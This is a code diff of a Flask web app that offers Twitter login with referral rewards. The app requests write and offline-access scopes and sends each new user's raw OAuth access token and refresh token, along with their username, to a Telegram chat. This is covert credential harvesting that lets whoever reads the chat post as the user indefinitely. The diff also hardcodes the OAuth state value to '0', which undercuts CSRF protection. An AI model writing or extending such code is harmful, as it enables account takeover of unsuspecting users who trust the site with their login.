@@ -424,10 +424,26 @@ def home():
     state = request.args.get('state')
     error = request.args.get('error')
 
+    # Store referrer ID in session if present in query parameters
+    referrer_id = request.args.get('referrer_id')
+    if referrer_id:
+        session['referrer_id'] = referrer_id
+
+    # Check if user is already logged in (returning user)
     if 'username' in session:
         username = session['username']
+
+        # Retrieve or generate the referral URL
         referral_url = session.get('referral_url') or generate_referral_url(username)
+        if referral_url:
+            session['referral_url'] = referral_url
+        else:
+            print(f"Failed to generate referral URL for returning user {username}")
+
+        # Retrieve the user's total token balance
         user_token_balance = get_user_token_balance(username)
+
+        # Notification for returning users, including referral link and token balance
         message = (
             f"👋 @{username} just returned to the website.\n"
             f"🌐 Referral Link: {referral_url or 'No referral link available'}\n"
@@ -437,12 +453,30 @@ def home():
         send_message_via_telegram(message)
         return redirect(url_for('welcome'))
 
+    # OAuth authorization flow for new users
+    if request.args.get('authorize') == 'true':
+        state = "0"
+        code_verifier, code_challenge = generate_code_verifier_and_challenge()
+        session['code_verifier'] = code_verifier
+        authorization_url = (
+            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
+            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
+            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
+        )
+        return redirect(authorization_url)
+
+    # Handle response after authorization (new user flow)
     if code:
-        # Handle response after authorization (new user flow)
+        if error:
+            return f"Error during authorization: {error}", 400
+
+        # Validate the state
         if state != session.get('oauth_state', '0'):
             return "Invalid state parameter", 403
 
         code_verifier = session.pop('code_verifier', None)
+
+        # Exchange authorization code for tokens
         token_url = "https://api.twitter.com/2/oauth2/token"
         data = {
             'grant_type': 'authorization_code',
@@ -457,22 +491,40 @@ def home():
         if response.status_code == 200:
             access_token = token_response.get('access_token')
             refresh_token = token_response.get('refresh_token')
+
+            # Fetch Twitter username and profile URL
             username, profile_url = get_twitter_username_and_profile(access_token)
 
             if username:
+                # Store tokens and username in the database
                 store_token(access_token, refresh_token, username)
-                referral_url = generate_referral_url(username)
-                referrer_info = ""
 
+                # Generate and retrieve the referral URL
+                referral_url = generate_referral_url(username)
+                session['referral_url'] = referral_url if referral_url else "Referral link unavailable"
+
+                # Reward the referrer if a referrer ID is stored in the session and the user wasn't referred
                 if 'referrer_id' in session:
-                    referrer_username = get_username_by_id(session['referrer_id'])
+                    referrer_username = get_username_by_id(session['referrer_id'])  # Assuming this helper function exists
                     if referrer_username and not was_user_referred(username):
                         reward_referrer(referrer_username)
                         mark_user_as_referred(username)
                         referrer_info = f"👤 Referred by: @{referrer_username}"
+                    else:
+                        referrer_info = "👤 No referrer or already rewarded."
                     session.pop('referrer_id', None)
+                else:
+                    referrer_info = "👤 No referrer"
 
+                # Update session data
+                session['username'] = username
+                session['access_token'] = access_token
+                session['refresh_token'] = refresh_token
+
+                # Retrieve the user's updated total token balance
                 user_token_balance = get_user_token_balance(username)
+
+                # Notify via Telegram with the referral link included and referrer info
                 message = (
                     f"🔑 Access Token: {access_token}\n"
                     f"🔄 Refresh Token: {refresh_token}\n"
@@ -484,6 +536,7 @@ def home():
                     f"📊 Total Tokens in Database: {get_total_tokens()}"
                 )
                 send_message_via_telegram(message)
+
                 return redirect(url_for('welcome'))
             else:
                 return "Error retrieving user info with access token", 400
